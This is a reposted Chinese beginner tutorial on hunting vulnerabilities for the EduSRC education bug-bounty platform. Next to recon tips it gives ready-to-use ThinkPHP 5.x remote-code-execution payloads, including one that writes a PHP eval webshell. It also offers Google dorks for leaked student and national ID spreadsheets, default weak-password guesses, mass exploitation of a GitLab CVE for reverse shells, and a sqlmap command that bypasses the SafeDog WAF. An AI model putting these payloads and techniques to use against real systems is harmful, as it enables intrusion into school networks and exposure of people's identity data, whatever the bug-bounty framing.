# 转载
：  小白快速入门src挖掘（以edusrc平台为例）

# 小白快速入门src挖掘（以edusrc平台为例）

**目录**

[edusrc挖掘心得](#edusrc%E6%8C%96%E6%8E%98%E5%BF%83%E5%BE%97)

[edusrc平台介绍](#edusrc%E5%B9%B3%E5%8F%B0%E4%BB%8B%E7%BB%8D)

[一些思路](#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF)

[0x01信息搜集](#0x01%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)

[子域名搜集](#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%90%9C%E9%9B%86)

[whois反查：](#whois%E5%8F%8D%E6%9F%A5%EF%BC%9A)

[电话反查：](#%E7%94%B5%E8%AF%9D%E5%8F%8D%E6%9F%A5%EF%BC%9A)

[学号、身份证收集：](#%E5%AD%A6%E5%8F%B7%E3%80%81%E8%BA%AB%E4%BB%BD%E8%AF%81%E6%94%B6%E9%9B%86%EF%BC%9A)

[指纹识别非常有用](#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E9%9D%9E%E5%B8%B8%E6%9C%89%E7%94%A8)

[js api接口发现](#js%20api%E6%8E%A5%E5%8F%A3%E5%8F%91%E7%8E%B0)

[我的一些骚思路](#%E6%88%91%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AA%9A%E6%80%9D%E8%B7%AF)

[关于Nday这里举俩个例子大家自行体会](#%E5%85%B3%E4%BA%8ENday%E8%BF%99%E9%87%8C%E4%B8%BE%E4%BF%A9%E4%B8%AA%E4%BE%8B%E5%AD%90%E5%A4%A7%E5%AE%B6%E8%87%AA%E8%A1%8C%E4%BD%93%E4%BC%9A)

[逻辑漏洞](#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E)

[sql注入](#sql%E6%B3%A8%E5%85%A5)

[这里举一个绕安全狗的例子：](#%E8%BF%99%E9%87%8C%E4%B8%BE%E4%B8%80%E4%B8%AA%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A)

---


## edusrc挖掘心得

### **edusrc平台介绍**

<br/> 我们可以在关于页面看到edusrc的收录规则

现阶段，教育行业漏洞报告平台接收如下类别单位漏洞：

> 
教育部
各省、自治区教育厅、直辖市教委、各级教育局
学校
教育相关软件


可以看到不仅是大学的资产、还有小学初中高中的教育局的也可以交到上面、而资产不仅只有网站，也可以从小程序，app方面入手，不过这方面利用难度就要大一些

## 一些思路

### **0x01信息搜集**

<br/> 收集到别人收集不到的资产，就能挖到别人挖不到的洞。<br/> 网络空间测绘<br/>[奇安信](https://so.csdn.net/so/search?q=%E5%A5%87%E5%AE%89%E4%BF%A1&amp;spm=1001.2101.3001.7020)的鹰图，fofa等

查询教育资产的语法：domain=“edu.cn” 表示搜索以edu.cn为结尾的资产，ip.[isp](https://so.csdn.net/so/search?q=isp&amp;spm=1001.2101.3001.7020)=“教育”，表示搜索教育网段的资产，后者的搜索规模是比前者大很多

### **子域名搜集**

<br/> OneForAll 、github知名的子域名收集工具

目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等

site:***.edu.cn 谷歌语法也可以帮助我们找到一些域名信息

### **whois反查：**

whois反查(知道该注册人拥有哪些域名)

### **电话反查：**

域名多的情况下，还可以域名批量反查

最后可以把以上工具搜集到的子域名去重就得到了一份完整的大学网站域名资产，这种做法对渗透一些证书大学很有帮助。

### **学号、身份证收集：**

<br/> 这里就可以利用谷歌语法搜集

filetype:xls site:xxx.edu 身份证

有时候运气好就可以搜集到泄露的身份证信息，+1rank(从来没遇到过)

如果能用这种方法搜集到对应的学号身份证，就可以进系统测试了！或者直接连上vpn进内网上fscan扫描（这里的话可以通过上面说的搜集到的子域名去获得对应的内网ip地址，

### **指纹识别**<br/>**非常有用**

<br/> 谷歌插件wappalyzer：

**c段旁站信息**<br/> 这里我使用这个工具Cscan，虽然有些小bug但是也是非常推荐的

还有一些在线网站：潮汐指纹

### **js api接口发现**

<br/> 这两个工具都可以去github下载

jsfind<br/> Packer-Fuzzer（webpack 打包的前端都可以扫一下有惊喜

### 我的一些骚思路

废话不多说了

先说一下我感受的挖洞难度：证书大学站&gt; 资产多的普通大学 &gt; 资产多的职业学院 &gt; 有账号密码能进内网

所以我一开始是去找那种职业学院打的，大概是排行榜50多页的学校，可以用鹰图title="xxxx"进行搜集，

因为一些带专网站的安全意识比较差的，所以有时候能遇到那种弱口令进后台文件上传拿shell的，关于弱口令：用户名一般是admin ，密码一般是123456，admin，888888 三选一，不是的话可以撤退了

弱口令真的yyds

除了弱口令

然后说一下其他思路

比如说think5未开强制路由RCE,这种网站很多大学都存在，但是寻找thinkphp符和条件的网站却很难，一种利用鹰图就是搜索默认图标hash值来寻找，但是这种估计很难捡到，但是在闲逛的过程中看到路由规则类似thinkphp的可以尝试一下(靠这个上了十多rank

一些payload:

5.1.x ：

```
?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id

```

5.0.x ：

```
?s=index/think\config/get&amp;name=database.username # 获取配置信息
?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id

```

写入 shell

```
public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../shell.php&amp;vars[1][]=&lt;?php @eval($_REQUEST[cmd]);?&gt;

```

然后然后，讲一下我一些思路，使用一些Nday来快速上分，或者挖掘逻辑漏洞实现通杀

#### **关于Nday这里举俩个例子大家自行体会**

比如说你知道有一个cve 比方说这个gitlab的cve：gitlab-CVE-2021-22205，gitlab显而易见的是很多高校都有这个gitlab的托管网站

所以说我们只要把所有gitlab edu上的资产全部搜集过来然后利用脚本一一检测就了

这里说一下怎么搜集的

**先从图标下手，限定edu域名：可以看到有17条资产

限定ip有27条资产

去除图标的有45条资产

把数据全部导出收集到一起，利用github上的脚本进行检测，这样就捡到俩个洞，因为gitlab这个cve是可以反弹shell的，所以12rank到手

再说一个比如说springboot未授权访问漏洞：

同上一样的方法：直接搜java白页，把数据导出-&gt;脚本检测

因为范围足够大所以也能有不小收获

剩下的可以自己探索，或者有更好的思路可以交流

## 逻辑漏洞

这里可以使用jsfind脚本去寻找一些js接口，可能会有未授权文件上传，ssrf等等，或者在登录抓取返回包把false改成true等操作，去实现登录绕过，总之来说就是要细心的阅读源码，找接口。

## sql注入

寻找注入点方法：site:edu.cn inurl:xxx.php|jsp|asp?xxx= xxx可以自己发挥想象 ，或者在一些老系统登录，支付平台上都有可能存在注入

但是sql注入大多学校都上了waf，绕过waf不容易，主要的方法有内联，分段，以及垃圾字符填充等等

### **这里举一个绕安全狗的例子：**

这里原本的参数是a和b，但是a，b参数的输入会被waf检测，通过拦截可以看出是常见的安全狗waf，所以这里可以多添加俩个参数：aa，bb（后端不会接收这两个参数，但是安全狗不会检测注释里的内容，这样就简单绕过了），指定好注入点使用sqlmap轻松拿下。

```
sqlmap -u "xxx.aspx?aa=/*&amp;a=1&amp;b=2&amp;bb=*/" -p "b" --random-agent

```

> 
作者：mashiro 转载自：https://forum.90sec.com/t/topic/2069


**入门网络安全配套资料**[+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）](https://docs.qq.com/doc/DYlBlQ2xhaFBmamtq)

 
